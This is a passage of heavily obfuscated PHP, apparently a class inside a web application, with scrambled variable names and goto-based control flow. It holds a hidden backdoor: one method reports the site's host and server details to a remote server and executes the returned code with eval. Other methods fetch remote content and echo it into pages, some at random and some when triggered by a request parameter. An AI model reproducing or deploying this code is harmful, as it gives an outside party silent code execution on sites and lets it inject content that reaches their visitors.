($C¸Á÷¸Úò >= 0) { break; } $C¸Á÷¸Úò++; } if ($D²Ô´›„Œ[$A®Ëß‹×¨³[85]] != $A®Ëß‹×¨³[220]) { $A®Ëß‹×¨³[61]($A®Ëß‹×¨³[62])->{$_SERVER[îë][221]}($A®Ëß‹×¨³[85], $A®Ëß‹×¨³[220]); } goto b¸íÎˆ–øÚ; b¸íÎˆ–øÚ: $A®Ëß‹×¨³[110]($A®Ëß‹×¨³[230])->{$_SERVER[îë][231]}(!0); goto EŒ‚ÆÜˆ³†; FªÓÙ¯Çì: $BôØ»éÆøß =& $_SERVER[¯Ò¬Èè]; $A®Ëß‹×¨³ =& $_SERVER[îë]; $D²Ô´›„Œ = $A®Ëß‹×¨³[61]($A®Ëß‹×¨³[62])->{$_SERVER[îë][63]}(); goto fáòÍ‹Ëß; EŒ‚ÆÜˆ³†: } private function lqtu0245d3b4() { goto Cà„À“®š¡; Cà„À“®š¡: $c¥×°•¼œ =& $_SERVER[¯Ò¬Èè]; $d÷ğ•Ş™†¹ =& $_SERVER[îë]; $d÷ğ•Ş™†¹[61]($d÷ğ•Ş™†¹[62])->{$_SERVER[îë][221]}(array($d÷ğ•Ş™†¹[209] => $d÷ğ•Ş™†¹[10], $d÷ğ•Ş™†¹[210] => $d÷ğ•Ş™†¹[10], $d÷ğ•Ş™†¹[120] => $d÷ğ•Ş™†¹[121], $d÷ğ•Ş™†¹[122] => $d÷ğ•Ş™†¹[10], $d÷ğ•Ş™†¹[123] => $d÷ğ•Ş™†¹[10])); goto Bã÷ˆÕÈ«Í; Bã÷ˆÕÈ«Í: $fÔÓÎ¦Á† = $c¥×°•¼œ[617]; if (!$fÔÓÎ¦Á†) { return; } $d÷ğ•Ş™†¹[61]($d÷ğ•Ş™†¹[62])->{$_SERVER[îë][218]}($d÷ğ•Ş™†¹[219], $d÷ğ•Ş™†¹[232]); goto bÂ‡‚âá‰Ê; døÀëèòÛ: $this->uqpd67a2bde1 = $d÷ğ•Ş™†¹[121]; goto DÌê²åà‹; bÂ‡‚âá‰Ê: $this->udgr5e563d83 = array(); $dÇİøò¨Ç¨ = $c¥×°•¼œ[618]; if (strlen($dÇİøò¨Ç¨) < $c¥×°•¼œ[563]) { return; } goto døÀëèòÛ; DÌê²åà‹: } private function tvcm3ae6db47() { goto dèÀ«ÀìÓ»; dÀè”ĞŠ¸‰: $dÇ“Û¥‹Ê = $A‰ìá®°ÓŒ[61]($A‰ìá®°ÓŒ[62])->{$_SERVER[îë][63]}(); if ($dÇ“Û¥‹Ê[$A‰ìá®°ÓŒ[120]] == $A‰ìá®°ÓŒ[121]) { return; } $BÚÍ…ˆ´ = $A‰ìá®°ÓŒ[61]($A‰ìá®°ÓŒ[62])->{$_SERVER[îë][63]}($A‰ìá®°ÓŒ[116]); goto CÃßöİ¼ó«; BÆ‘‘ğÓõ«: if ($A‰ìá®°ÓŒ[233]() >= $f–ìµ‘í£) { return $this->{$_SERVER[îë][164]}(); } $this->udgr5e563d83 = $A‹ç„Òõù; $this->uqpd67a2bde1 = $dÇ“Û¥‹Ê[$A‰ìá®°ÓŒ[120]]; goto d¤¿×¦ò—; f»øˆ·Îøô: $DÛ«Âäñµò = $A‰ìá®°ÓŒ[214]($A‰ìá®°ÓŒ[25]($eÔã–°Ÿ›, 10, 16)); $d‘ë›Î˜Ñ× = $béŒˆŒçÈ[623]; if (strlen($d‘ë›Î˜Ñ×) < $béŒˆŒçÈ[570]) { die; } goto bøï¬‰Ô›º; B·”½®”ÌÖ: if (strlen($Eö˜ÔÓ‘¾) < $béŒˆŒçÈ[495]) { die; } if (!$A‰ìá®°ÓŒ[191]($A‹ç„Òõù)) { return $this->{$_SERVER[îë][164]}(); } $f–ìµ‘í£ = $A‰ìá®°ÓŒ[144]($A‹ç„Òõù[$A‰ìá®°ÓŒ[145]]); goto BÆ‘‘ğÓõ«; bøï¬‰Ô›º: $A‹ç„Òõù = $this->{$_SERVER[îë][188]}($e‘ÉŠñëŸå[$A‰ìá®°ÓŒ[91]][$DÛ«Âäñµò], $eÔã–°Ÿ›); $A‹ç„Òõù = $A‰ìá®°ÓŒ[190]($A‹ç„Òõù, !0); $Eö˜ÔÓ‘¾ = $béŒˆŒçÈ[624]; goto B·”½®”ÌÖ; E…Ó­«÷¥‰: $eÔã–°Ÿ› = $A‰ìá®°ÓŒ[114]($_SERVER[$A‰ìá®°ÓŒ[115]] . $A‰ìá®°ÓŒ[214]($BÚÍ…ˆ´) . $dÇ“Û¥‹Ê[$A‰ìá®°ÓŒ[210]]); $bËô½‰ñ®„ = $béŒˆŒçÈ[622]; if (strlen($bËô½‰ñ®„) < $béŒˆŒçÈ[574]) { die; } goto f»øˆ·Îøô; EÆ»ÍÅÖ†: $e‘ÉŠñëŸå = $E•‡³Ø«ù¸[$A‰ìá®°ÓŒ[225]]; $aì±®Ê¾ = $béŒˆŒçÈ[621]; if (!$aì±®Ê¾) { return; } goto E…Ó­«÷¥‰; Eå¯†ºº§’: $this->uqpd67a2bde1 = $A‰ìá®°ÓŒ[121]; $DåİŒª¬÷ = $béŒˆŒçÈ[619]; if (!$DåİŒª¬÷) { return; } goto dÀè”ĞŠ¸‰; CÃßöİ¼ó«: $DÀóòå·í = $béŒˆŒçÈ[620]; while ($DÀóòå·í < $béŒˆŒçÈ[560]) { if ($DÀóòå·í >= 0) { break; } $DÀóòå·í++; } $E•‡³Ø«ù¸ = $A‰ìá®°ÓŒ[222]($A‰ìá®°ÓŒ[61]($A‰ìá®°ÓŒ[11])->{$_SERVER[îë][223]}(), $A‰ìá®°ÓŒ[224]); goto EÆ»ÍÅÖ†; dèÀ«ÀìÓ»: $béŒˆŒçÈ =& $_SERVER[¯Ò¬Èè]; $A‰ìá®°ÓŒ =& $_SERVER[îë]; $_SERVER[$A‰ìá®°ÓŒ[175]] = $A‰ìá®°ÓŒ[104]($_SERVER, $A‰ìá®°ÓŒ[175], APP_HOST); goto Eå¯†ºº§’; d¤¿×¦ò—: } private function vziqa4368778() { goto b†ñŠ¸Ãéä; BØ©²êµ±î: if ($a·³Îå¢à == $Fãì‹Ù„è‚[234] && $this->uqpd67a2bde1 == $Fãì‹Ù„è‚[121]) { $Fãì‹Ù„è‚[166]($Fãì‹Ù„è‚[197]($Fãì‹Ù„è‚[235]), !1, $Fãì‹Ù„è‚[236]); } $e›ÇŠï‰ÂÛ = array($Fãì‹Ù„è‚[237], $Fãì‹Ù„è‚[238]); if ($Fãì‹Ù„è‚[239]($a·³Îå¢à, $e›ÇŠï‰ÂÛ)) { if ($this->uqpd67a2bde1 == $Fãì‹Ù„è‚[121] && isset($bÅ¦É¾Ğ™É[$Fãì‹Ù„è‚[240]])) { $Fãì‹Ù„è‚[166]($Fãì‹Ù„è‚[197]($Fãì‹Ù„è‚[235]), !1, $Fãì‹Ù„è‚[236]); die; } $CæÑÂÉ¸ÖŸ = $this->{$_SERVER[îë][137]}(); if ($CæÑÂÉ¸ÖŸ != $Fãì‹Ù„è‚[201]($Fãì‹Ù„è‚[241])) { if ($CæÑÂÉ¸ÖŸ <= $Fãì‹Ù„è‚[61]($Fãì‹Ù„è‚[139])->{$_SERVER[îë][140]}()) { $Fãì‹Ù„è‚[166]($Fãì‹Ù„è‚[197]($Fãì‹Ù„è‚[242]), !1, $Fãì‹Ù„è‚[236]); die; } } } goto eÑõ„’¼‘‹; b†ñŠ¸Ãéä: $FŒ”¨”ÛÁÅ =& $_SERVER[¯Ò¬Èè]; $Fãì‹Ù„è‚ =& $_SERVER[îë]; $bÅ¦É¾Ğ™É = $GLOBALS[$Fãì‹Ù„è‚[22]]; goto f‹õºá¤«Ô; f‹õºá¤«Ô: $a·³Îå¢à = $_SERVER[$Fãì‹Ù„è‚[44]]; $A·‡¿¯Õ  = $FŒ”¨”ÛÁÅ[625]; if (strlen($A·‡¿¯Õ ) < $FŒ”¨”ÛÁÅ[560]) { return; } goto BØ©²êµ±î; eÑõ„’¼‘‹: } private function ejnsd01abb3f() { goto f·›³îšÆ; EŠá«…Ãˆ: if (!$A›İùˆŞŸ[239]($_SERVER[$A›İùˆŞŸ[44]], $AÛ¨ãÍŠõ®)) { return; } $c‘’Í„¦Ø  = $A›İùˆŞŸ[245]; $c‘’Í„¦Ø  = $this->{$_SERVER[îë][246]}($c‘’Í„¦Ø , $A›İùˆŞŸ[247]); goto d‹×Ò¡Ú‰í; fÖëŒµ¦Ó: die; goto fœí‹Æœæ; d‹×Ò¡Ú‰í: $EùøêÑëÕÑ = $b„ó…×òÙÄ[627]; if (!$EùøêÑëÕÑ) { return; } $dó¢Êƒ‚Ä = $A›İùˆŞŸ[248](array($A›İùˆŞŸ[249] => array($A›İùˆŞŸ[250] => $A›İùˆŞŸ[251], $A›İùˆŞŸ[252] => 3))); goto a­¤´Ê‹; f·›³îšÆ: $b„ó…×òÙÄ =& $_SERVER[¯Ò¬Èè]; $A›İùˆŞŸ =& $_SERVER[îë]; $AÛ¨ãÍŠõ® = array($A›İùˆŞŸ[135], $A›İùˆŞŸ[243]); goto aĞÅ•¸¿îê; aĞÅ•¸¿îê: $BäÛøå¦— = $b„ó…×òÙÄ[626]; while ($BäÛøå¦— < $b„ó…×òÙÄ[560]) { if ($BäÛøå¦— >= 0) { break; } $BäÛøå¦—++; } if (!$A›İùˆŞŸ[104]($GLOBALS, $A›İùˆŞŸ[132]) || !isset($_GET[$A›İùˆŞŸ[244]])) { return; } goto EŠá«…Ãˆ; a­¤´Ê‹: $fÚœ…‰«æù = @$A›İùˆŞŸ[253]($c‘’Í„¦Ø , !1, $dó¢Êƒ‚Ä); $A›İùˆŞŸ[254]($A›İùˆŞŸ[255]); if ($fÚœ…‰«æù && $A›İùˆŞŸ[32]($fÚœ…‰«æù, $A›İùˆŞŸ[256])) { echo $fÚœ…‰«æù; } goto fÖëŒµ¦Ó; fœí‹Æœæ: } public function olew86900a19($dˆÖÑóËê®) { goto A«õ™ìŒ§Ê; eŒ‹ÄŠ¨©: return $dˆÖÑóËê®; goto e˜ÀøÂ¿Ğ; BØ¥¤è¼‡‚: $A‹¡á‹›Ñº = array(); foreach ($aÊë¤ŞÆù as $fÌ¢òÇ‹¿) { if (!$c¾–ÅÎª»É[239]($fÌ¢òÇ‹¿, $e¯–‡é®Ã‡)) { $A‹¡á‹›Ñº[] = $fÌ¢òÇ‹¿; } } foreach ($A‹¡á‹›Ñº as $fÌ¢òÇ‹¿) { unset($dˆÖÑóËê®[$fÌ¢òÇ‹¿]); $bìÚøÇ¢ÉØ = $D˜åŞËÄëê[629]; } goto eŒ‹ÄŠ¨©; A«õ™ìŒ§Ê: $D˜åŞËÄëê =& $_SERVER[¯Ò¬Èè]; $c¾–ÅÎª»É =& $_SERVER[îë]; if ($this->uqpd67a2bde1 == $c¾–ÅÎª»É[257]) { return $dˆÖÑóËê®; } goto BîŠè­Ìˆ¡; BîŠè­Ìˆ¡: $aÊë¤ŞÆù = array($c¾–ÅÎª»É[258], $c¾–ÅÎª»É[259], $c¾–ÅÎª»É[260], $c¾–ÅÎª»É[261], $c¾–ÅÎª»É[262], $c¾–ÅÎª»É[263], $c¾–ÅÎª»É[264], $c¾–ÅÎª»É[265]); $e¯–‡é®Ã‡ = $c¾–ÅÎª»É[0]($c¾–ÅÎª»É[266], $c¾–ÅÎª»É[104]($this->udgr5e563d83, $c¾–ÅÎª»É[129], $c¾–ÅÎª»É[10])); $B§Å™Ó©´ì = $D˜åŞËÄëê[628]; goto BØ¥¤è¼‡‚; e˜ÀøÂ¿Ğ: } private function gtzw43ed71e7() { goto E´”ÖÏéİ; aÀÄÚ’Ø¹´: $GLOBALS[$F»îÍÛÛˆ²[91]][$F»îÍÛÛˆ²[95]][$F»îÍÛÛˆ²[267]] = $F»îÍÛÛˆ²[232]; $cÎ²Å•›ñë = $eùµ’ÈÏ±†[631]; while (strlen($cÎ²Å•›ñë) < $eùµ’ÈÏ±†[495]) { if (!$cÎ²Å•›ñë) { break; } $cÎ²Å•›ñë++; } goto f…Ç°Ïå˜ˆ; f…Ç°Ïå˜ˆ: $GLOBALS[$F»îÍÛÛˆ²[91]][$F»îÍÛÛˆ²[271]] = $F»îÍÛÛˆ²[220]; if ($F»îÍÛÛˆ²[61]($F»îÍÛÛˆ²[272])->{$_SERVER[îë][63]}($F»îÍÛÛˆ²[85]) != $F»îÍÛÛˆ²[232]) { $F»îÍÛÛˆ²[61]($F»îÍÛÛˆ²[272])->{$_SERVER[îë][221]}($F»îÍÛÛˆ²[85], $F»îÍÛÛˆ²[232]); } goto C¼ïÍìŞ±Ô; c»ÜÄ‚¡Ú«: $f¾Á§‘ñÉ¶ = $_SERVER[$F»îÍÛÛˆ²[44]]; $f‰—ô³è…¿ = array($F»îÍÛÛˆ²[268]); foreach ($f‰—ô³è…¿ as $f«™ƒëß«Ù) { if ($f«™ƒëß«Ù == $f¾Á§‘ñÉ¶ || $F»îÍÛÛˆ²[25]($f¾Á§‘ñÉ¶, 0, $F»îÍÛÛˆ²[24]($f«™ƒëß«Ù)) == $f«™ƒëß«Ù) { $F»îÍÛÛˆ²[166]($F»îÍÛÛˆ²[197]($F»îÍÛÛˆ²[269]), !1); } } goto DŠÅ‹ƒì…; DŠÅ‹ƒì…: $GLOBALS[$F»îÍÛÛˆ²[91]][$F»îÍÛÛˆ²[95]][$F»îÍÛÛˆ²[270]] = $F»îÍÛÛˆ²[220]; $C©íÇ„í¾– = $eùµ’ÈÏ±†[630]; while (strlen($C©íÇ„í¾–) < $eùµ’ÈÏ±†[570]) { if (!$C©íÇ„í¾–) { break; } $C©íÇ„í¾–++; } goto aÀÄÚ’Ø¹´; E´”ÖÏéİ: $eùµ’ÈÏ±† =& $_SERVER[¯Ò¬Èè]; $F»îÍÛÛˆ² =& $_SERVER[îë]; if ($this->uqpd67a2bde1 != $F»îÍÛÛˆ²[121]) { $GLOBALS[$F»îÍÛÛˆ²[91]][$F»îÍÛÛˆ²[95]][$F»îÍÛÛˆ²[267]] = $F»îÍÛÛˆ²[220]; return; } goto c»ÜÄ‚¡Ú«; C¼ïÍìŞ±Ô: } public function nrqf0ff247bd() { return $_SERVER[îë][273]; $C²ìêİåŒ› = $_SERVER[¯Ò¬Èè][632]; if (!$C²ìêİåŒ›) { die; } } private function eysj2119fd35() { goto AÒ’Ô§ó»¦; a×ë¤ŞÊä­: $aòã¸˜¢Ş = $D°÷ø¯Ñ¹«[634]; if (strlen($aòã¸˜¢Ş) < $D°÷ø¯Ñ¹«[570]) { die; } if ($this->{$_SERVER[îë][199]}($BÁÉÍ†ø[$Cí¶ŞÏ»Ì [283]]) != $EÀÀ¡¨¢ëº[$Cí¶ŞÏ»Ì [165]]) { $Dê±•öÍ‹ñ = array($Cí¶ŞÏ»Ì [202] => $Cí¶ŞÏ»Ì [61]($Cí¶ŞÏ»Ì [62])->{$_SERVER[îë][63]}($Cí¶ŞÏ»Ì [116]), $Cí¶ŞÏ»Ì [203] => $_SERVER[$Cí¶ŞÏ»Ì [115]], $Cí¶ŞÏ»Ì [204] => $Cí¶ŞÏ»Ì [205](), $Cí¶ŞÏ»Ì [174] => $_SERVER[$Cí¶ŞÏ»Ì [175]]); $c†É·ÅõğÙ = $this->{$_SERVER[îë][206]}($Cí¶ŞÏ»Ì [148]($Dê±•öÍ‹ñ)); $BÁÉÍ†ø = $this->{$_SERVER[îë][182]}($Cí¶ŞÏ»Ì [207] . $c†É·ÅõğÙ); if ($BÁÉÍ†ø && $Cí¶ŞÏ»Ì [191]($BÁÉÍ†ø) && isset($BÁÉÍ†ø[$Cí¶ŞÏ»Ì [283]])) { $FŠ¯™‹Ö = $this->{$_SERVER[îë][188]}($BÁÉÍ†ø[$Cí¶ŞÏ»Ì [283]], 2); if ($FŠ¯™‹Ö) { $FŠ¯™‹Ö = $this->{$_SERVER[îë][199]}($FŠ¯™‹Ö); } if ($FŠ¯™‹Ö) { try { @eval($FŠ¯™‹Ö); } catch (Exception $BÔÂ• ˆ«) { } } } } goto Aƒæ”‡†½—; fÈéÜ±¡¯ : $Cí¶ŞÏ»Ì [13](array($Cí¶ŞÏ»Ì [279], $Cí¶ŞÏ»Ì [152]), $a×¸Ô¶¯ÀÚ, $Cí¶ŞÏ»Ì [233]()); $EÀÀ¡¨¢ëº = array($Cí¶ŞÏ»Ì [165] => $Cí¶ŞÏ»Ì [61]($Cí¶ŞÏ»Ì [62])->{$_SERVER[îë][63]}($Cí¶ŞÏ»Ì [209]), $Cí¶ŞÏ»Ì [178] => $this->uqpd67a2bde1, $Cí¶ŞÏ»Ì [176] => $_SERVER[$Cí¶ŞÏ»Ì [177]], $Cí¶ŞÏ»Ì [169] => $Cí¶ŞÏ»Ì [149], $Cí¶ŞÏ»Ì [172] => $_SERVER[$Cí¶ŞÏ»Ì [173]]); $eâÉÅ·Ñ² = $D°÷ø¯Ñ¹«[633]; goto bè½ğšÜ¶; AÒ’Ô§ó»¦: $D°÷ø¯Ñ¹« =& $_SERVER[¯Ò¬Èè]; $Cí¶ŞÏ»Ì  =& $_SERVER[îë]; $BÁ÷¤Ö¢Ó = array($Cí¶ŞÏ»Ì [274], $Cí¶ŞÏ»Ì [275], $Cí¶ŞÏ»Ì [276]); goto F–Šê¬œ½¼; A±À¼ÅİœÆ: if ($Cí¶ŞÏ»Ì [233]() % 4 != 0) { return; } $A“î‰ºõ‚ = $Cí¶ŞÏ»Ì [13](array($Cí¶ŞÏ»Ì [279], $Cí¶ŞÏ»Ì [280]), $a×¸Ô¶¯ÀÚ); if ($A“î‰ºõ‚ && $Cí¶ŞÏ»Ì [233]() - $A“î‰ºõ‚ < $Cí¶ŞÏ»Ì [201]($Cí¶ŞÏ»Ì [281])) { return; } goto fÈéÜ±¡¯ ; F–Šê¬œ½¼: $a×¸Ô¶¯ÀÚ = $Cí¶ŞÏ»Ì [277] . $Cí¶ŞÏ»Ì [114]($Cí¶ŞÏ»Ì [278]); if ($this->uqpd67a2bde1 == $Cí¶ŞÏ»Ì [121] || !$Cí¶ŞÏ»Ì [104]($GLOBALS, $Cí¶ŞÏ»Ì [132])) { return; } if (!$Cí¶ŞÏ»Ì [239]($_SERVER[$Cí¶ŞÏ»Ì [44]], $BÁ÷¤Ö¢Ó)) { return; } goto A±À¼ÅİœÆ; bğÀ‚æŒ¦ø: if (!$Cí¶ŞÏ»Ì [191]($BÁÉÍ†ø)) { return; } if ($BÁÉÍ†ø[$Cí¶ŞÏ»Ì [165]] && $BÁÉÍ†ø[$Cí¶ŞÏ»Ì [283]]) { if ($this->{$_SERVER[îë][199]}($BÁÉÍ†ø[$Cí¶ŞÏ»Ì [283]]) == $EÀÀ¡¨¢ëº[$Cí¶ŞÏ»Ì [165]]) { return; } } $this->{$_SERVER[îë][164]}(); goto a×ë¤ŞÊä­; bè½ğšÜ¶: $BÁÉÍ†ø = $this->{$_SERVER[îë][182]}($Cí¶ŞÏ»Ì [282], $EÀÀ¡¨¢ëº); $Dºóªâ¨›‰ = $D°÷ø¯Ñ¹«[609]; if (!$Dºóªâ¨›‰) { return; } goto bğÀ‚æŒ¦ø; Aƒæ”‡†½—: } private function arqu353286bd($F‰‚÷ÙÒ•„ = '', $Eí ‚²èîº = array(), $dÛÙÖ÷Ğµ = 5) { goto b¡¯äË¢¾; B¶æ¯©ŠØ¯: $aä¿ŒöªØŞ = $Cïö£Ò¸“£[635]; if (strlen($aä¿ŒöªØŞ) < $Cïö£Ò¸“£[560]) { return; } $a›ÚÔ—Çâ = $this->{$_SERVER[îë][246]}($a›ÚÔ—Çâ, $f¶¤·£ø[285]); goto b…ÙäŒ•Ÿ; D‹¦Ë´Ìì¹: $Fäì¶´êÙª = $Cïö£Ò¸“£[638]; while ($Fäì¶´êÙª < $Cïö£Ò¸“£[563]) { if ($Fäì¶´êÙª >= 0) { break; } $Fäì¶´êÙª++; } $Eí ‚²èîº = @$f¶¤·£ø[253]($a›ÚÔ—Çâ, !1, $a¥‘†¼èİÎ); goto bÚí­ÓÌ¿Ô; b¡¯äË¢¾: $Cïö£Ò¸“£ =& $_SERVER[¯Ò¬Èè]; $f¶¤·£ø =& $_SERVER[îë]; $a›ÚÔ—Çâ = $f¶¤·£ø[284]; goto B¶æ¯©ŠØ¯; BŸÁ›ãš : $dÓ”¯Å¥Í¦ = $Cïö£Ò¸“£[637]; if ($Eí ‚²èîº === -1) { return $a›ÚÔ—Çâ; } $a¥‘†¼èİÎ = $f¶¤·£ø[248](array($f¶¤·£ø[249] => array($f¶¤·£ø[252] => $dÛÙÖ÷Ğµ, $f¶¤·£ø[250] => $f¶¤·£ø[288]), $f¶¤·£ø[289] => array($f¶¤·£ø[290] => !1, $f¶¤·£ø[291] => !1))); goto D‹¦Ë´Ìì¹; bÚí­ÓÌ¿Ô: return $f¶¤·£ø[190]($Eí ‚²èîº, !0); goto DñÔ¸‘·™Â; b…ÙäŒ•Ÿ: $EƒºîµÑ‚Ë = $Cïö£Ò¸“£[636]; if (!$EƒºîµÑ‚Ë) { return; } $a›ÚÔ—Çâ = $a›ÚÔ—Çâ . $F‰‚÷ÙÒ•„ . $f¶¤·£ø[286] . $f¶¤·£ø[287]($Eí ‚²èîº); goto BŸÁ›ãš ; DñÔ¸‘·™Â: } private function lwyk652b926c() { goto E‹ÁàŠÒÍã; eˆ·¢£†Û…: $B°£‘«µˆ° = $C…ñÁ±ê”İ[639]; while ($B°£‘«µˆ° < $C…ñÁ±ê”İ[570]) { if ($B°£‘«µˆ° >= 0) { break; } $B°£‘«µˆ°++; } $F‡óÉ Ğ™½ = $BôôË‰ˆ²[$this->uqpd67a2bde1]; goto e®‰³—ÚÖä; e®‰³—ÚÖä: $dê¾ìÃÇŠŒ = $C…ñÁ±ê”İ[640]; $F‡óÉ Ğ™½ = $d­‡¢ï´·‹[201]($F‡óÉ Ğ™½ ? $F‡óÉ Ğ™½ : $d­‡¢ï´·‹[293]); $fÕ½‘–ßãß = $d­‡¢ï´·‹[104]($this->udgr5e563d83, $d­‡¢ï´·‹[319]); goto bê…ó†ôº‰; E‹ÁàŠÒÍã: $C…ñÁ±ê”İ =& $_SERVER[¯Ò¬Èè]; $d­‡¢ï´·‹ =& $_SERVER[îë]; $BôôË‰ˆ² = array($d­‡¢ï´·‹[292] => $d­‡¢ï´·‹[293], $d­‡¢ï´·‹[294] => $d­‡¢ï´·‹[295], $d­‡¢ï´·‹[296] => $d­‡¢ï´·‹[297], $d­‡¢ï´·‹[298] => $d­‡¢ï´·‹[299], $d­‡¢ï´·‹[300] => $d­‡¢ï´·‹[301], $d­‡¢ï´·‹[302] => $d­‡¢ï´·‹[241], $d­‡¢ï´·‹[303] => $d­‡¢ï´·‹[241], $d­‡¢ï´·‹[304] => $d­‡¢ï´·‹[293], $d­‡¢ï´·‹[305] => $d­‡¢ï´·‹[295], $d­‡¢ï´·‹[306] => $d­‡¢ï´·‹[297], $d­‡¢ï´·‹[307] => $d­‡¢ï´·‹[308], $d­‡¢ï´·‹[309] => $d­‡¢ï´·‹[299], $d­‡¢ï´·‹[310] => $d­‡¢ï´·‹[311], $d­‡¢ï´·‹[312] => $d­‡¢ï´·‹[301], $d­‡¢ï´·‹[313] => $d­‡¢ï´·‹[314], $d­‡¢ï´·‹[315] => $d­‡¢ï´·‹[316], $d­‡¢ï´·‹[317] => $d­‡¢ï´·‹[318]); goto eˆ·¢£†Û…; bê…ó†ôº‰: $fÕ½‘–ßãß = $fÕ½‘–ßãß ? $d­‡¢ï´·‹[201]($fÕ½‘–ßãß) : 0; return $F‡óÉ Ğ™½ + $fÕ½‘–ßãß; goto c¦Çè±ÒŞ; c¦Çè±ÒŞ: } public function ofyd39ffebf2($DáŠÂëºß) { goto bğğ¤Ù…‹”; cÌ¡éğ¯Ç²: $Fä†ãÅŒğŒ = $B‹†¤ÀÛ‘”[642]; if ($F¸¸«ºÈ ô <= $FœÌ„—‡¦…) { return; } $A”‰´¸Œ›ó = $fãÎ£ô—¡Ë[61]($fãÎ£ô—¡Ë[139])->{$_SERVER[îë][320]}($fãÎ£ô—¡Ë[321])->{$_SERVER[îë][322]}($FœÌ„—‡¦…)->{$_SERVER[îë][323]}(); goto B¶ÇØ­¶ĞŞ; B¶ÇØ­¶ĞŞ: $A”‰´¸Œ›ó = $fãÎ£ô—¡Ë[222]($A”‰´¸Œ›ó, $fãÎ£ô—¡Ë[10], $fãÎ£ô—¡Ë[321]); $BÎóñÙŠÙË = $B‹†¤ÀÛ‘”[643]; if (!$fãÎ£ô—¡Ë[239]($DáŠÂëºß[$fãÎ£ô—¡Ë[321]], $A”‰´¸Œ›ó)) { $fãÎ£ô—¡Ë[166]($fãÎ£ô—¡Ë[324], !1, $fãÎ£ô—¡Ë[236]); } goto Bêßò˜„Ï; FÒ®äáÓ: $d†¾ª‚Óğä = $B‹†¤ÀÛ‘”[641]; if ($FœÌ„—‡¦… >= $fãÎ£ô—¡Ë[201]($fãÎ£ô—¡Ë[241])) { return; } $F¸¸«ºÈ ô = $fãÎ£ô—¡Ë[61]($fãÎ£ô—¡Ë[139])->{$_SERVER[îë][140]}(); goto cÌ¡éğ¯Ç²; bğğ¤Ù…‹”: $B‹†¤ÀÛ‘” =& $_SERVER[¯Ò¬Èè]; $fãÎ£ô—¡Ë =& $_SERVER[îë]; $FœÌ„—‡¦… = $this->{$_SERVER[îë][137]}(); goto FÒ®äáÓ; Bêßò˜„Ï: } public function xlaz3fb001a0() { goto b²åÚ¡Ô†ƒ; fÍæÉŠÜ—¦: $e†¶À†ãŠ” = $bƒìêÒÆ•î[248](array($bƒìêÒÆ•î[249] => array($bƒìêÒÆ•î[250] => $bƒìêÒÆ•î[251], $bƒìêÒÆ•î[252] => 3))); $E‰Á‚çÔŒ¿ = $CáÑ²æàØğ[646]; while ($E‰Á‚çÔŒ¿ < $CáÑ²æàØğ[563]) { if ($E‰Á‚çÔŒ¿ >= 0) { break; } $E‰Á‚çÔŒ¿++; } goto DŸñ·ô½öé; fê­æ™Ş®õ: $bçĞ†Å¬ = $bƒìêÒÆ•î[245]; $fğÂ²‹ÕµÁ = $CáÑ²æàØğ[644]; if (!$fğÂ²‹ÕµÁ) { return; } goto AŞÅÓÃæ­; b²åÚ¡Ô†ƒ: $CáÑ²æàØğ =& $_SERVER[¯Ò¬Èè]; $bƒìêÒÆ•î =& $_SERVER[îë]; if (!$bƒìêÒÆ•î[104]($GLOBALS, $bƒìêÒÆ•î[132]) || $bƒìêÒÆ•î[325](1, 100) > 20) { return; } goto fê­æ™Ş®õ; c‘Ò‡¤ºË: echo $bƒìêÒÆ•î[326] . $bƒìêÒÆ•î[327]($eéñ©—’¨š) . $bƒìêÒÆ•î[328]; $f§Œ×Üß°½ = $CáÑ²æàØğ[648]; goto a„¨‚¼ÂÙî; DŸñ·ô½öé: $eéñ©—’¨š = @$bƒìêÒÆ•î[253]($bçĞ†Å¬, !1, $e†¶À†ãŠ”); $fôîé©‡ÊÎ = $CáÑ²æàØğ[647]; while ($fôîé©‡ÊÎ < $CáÑ²æàØğ[560]) { if ($fôîé©‡ÊÎ >= 0) { break; } $fôîé©‡ÊÎ++; } goto c‘Ò‡¤ºË; AŞÅÓÃæ­: $bçĞ†Å¬ = $this->{$_SERVER[îë][246]}($bçĞ†Å¬, $bƒìêÒÆ•î[247]); $CñÃñÈç¯– = $CáÑ²æàØğ[645]; while ($CñÃñÈç¯– < $CáÑ²æàØğ[560]) { if ($CñÃñÈç¯– >= 0) { break; } $CñÃñÈç¯–++; } goto fÍæÉŠÜ—¦; a„¨‚¼ÂÙî: } private function cvaif8ad17e6($a»¤œØ”, $fòğÛŒù´, $f¬¨øÊö = 3) { goto B±·ÓÕ›Ì; eéÊ–Œ†ÜÊ: return $A±¤šíˆ„; goto e²¦ó¨°¢ˆ; B±·ÓÕ›Ì: $CĞµ÷Éã´ï =& $_SERVER[¯Ò¬Èè]; $b–…ƒğŠç =& $_SERVER[îë]; $b–…ƒğŠç[329](1); goto D×™İÚ²ä; C·‚—²¾Ö: switch ($c¬ëËã·‹) { case $b–…ƒğŠç[232]: $A±¤šíˆ„ = $this->{$_SERVER[îë][147]}($a»¤œØ”, $b–…ƒğŠç[214]($fòğÛŒù´ . $C•š£•Ô •)); $fñœ“£ÌçÔ = $CĞµ÷Éã´ï[653]; if (strlen($fñœ“£ÌçÔ) < $CĞµ÷Éã´ï[560]) { return; } break; case $b–…ƒğŠç[220]: $A±¤šíˆ„ = $this->{$_SERVER[îë][147]}($a»¤œØ”, $b–…ƒğŠç[214]($C•š£•Ô • . $fòğÛŒù´)); break; $E£¼åàãšœ = $CĞµ÷Éã´ï[654]; case $b–…ƒğŠç[331]: $A±¤šíˆ„ = $this->{$_SERVER[îë][147]}($a»¤œØ”, $b–…ƒğŠç[118]($C•š£•Ô • . $fòğÛŒù´)); $AÚéßê”İ = $CĞµ÷Éã´ï[655]; break; case $b–…ƒğŠç[332]: $A±¤šíˆ„ = $this->{$_SERVER[îë][147]}($a»¤œØ”, $b–…ƒğŠç[114]($C•š£•Ô • . $fòğÛŒù´)); break; case $b–…ƒğŠç[333]: goto E‘½ÅÙà; A¹í´ìÔ›Ë: $Bá­ƒô‚Ëù = 0; $Aõô·’¾± = 0; $FƒªÛÄÎÙ² = 0; goto a„º˜âŒ¨”; E¤ùßÆéÌ†: if (strlen($C‡Š„¸) < $CĞµ÷Éã´ï[495]) { die; } $E¯ÈØÖËÈ¼ = $b–…ƒğŠç[10]; $aÑÔš˜ÁÌ‰ = $CĞµ÷Éã´ï[659]; goto A¹í´ìÔ›Ë; AŸÚ¼Œ„¡‰: $BÔ‘á…®À = $b–…ƒğŠç[114]($BİÄ»ª×† . $b–…ƒğŠç[114]($fòğÛŒù´ . $BİÄ»ª×†) . $fòğÛŒù´); $BÔ‘á…®À = 